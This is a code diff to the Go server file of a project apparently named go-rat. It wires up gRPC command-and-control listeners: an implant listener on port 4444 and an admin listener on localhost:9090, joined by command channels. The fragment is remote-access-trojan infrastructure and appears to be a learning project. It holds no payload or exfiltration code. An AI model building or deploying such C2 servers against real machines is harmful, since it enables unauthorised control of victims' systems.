@@ -1,8 +1,9 @@
-package server
+package main
 
 import (
 	"context"
 	"errors"
+	"fmt"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"log"
@@ -19,14 +20,14 @@ type adminServer struct {
 	grpcapi.AdminServer
 }
 
-func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
+func newImplantServer(work, output chan *grpcapi.Command) *implantServer {
 	s := new(implantServer)
 	s.work = work
 	s.output = output
 	return s
 }
 
-func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
+func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
 	s := new(adminServer)
 	s.work = work
 	s.output = output
@@ -69,20 +70,36 @@ func main() {
 		work, output                   chan *grpcapi.Command
 	)
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
-	implant := NewImplantServer(work, output)
-	admin := NewAdminServer(work, output)
-	if implantListener, err := net.Listen("tcp", "localhost:4444"); err != nil {
+	implant := newImplantServer(work, output)
+	admin := newAdminServer(work, output)
+	client_addr := ":9090"
+	implant_addr := ":4444"
+	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
 		log.Print(implantListener)
 		log.Print("Error en el listener del implant")
 		log.Fatal(err)
 	}
-	if adminListener, err := net.Listen("tcp", "localhost:9090"); err != nil {
+
+	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
 		log.Print(adminListener)
 		log.Print("Error en el listener del admin")
 		log.Fatal(err)
 	}
 
+	if adminListener != nil && implantListener != nil {
+		log.Printf("[*] Client listening at %s.\n", client_addr)
+		log.Printf("[*] Implant listening at %s.\n", implant_addr)
+	} else {
+		log.Fatal("Could not listen.")
+	}
+
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
+	if grpcAdminServer == nil || admin == nil {
+		log.Fatal("grpcAdmin server es nulo")
+	}
+	if grpcImplantServer == nil || implant == nil {
+		log.Fatal("grpcAdmin server es nulo")
+	}
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	go func() {
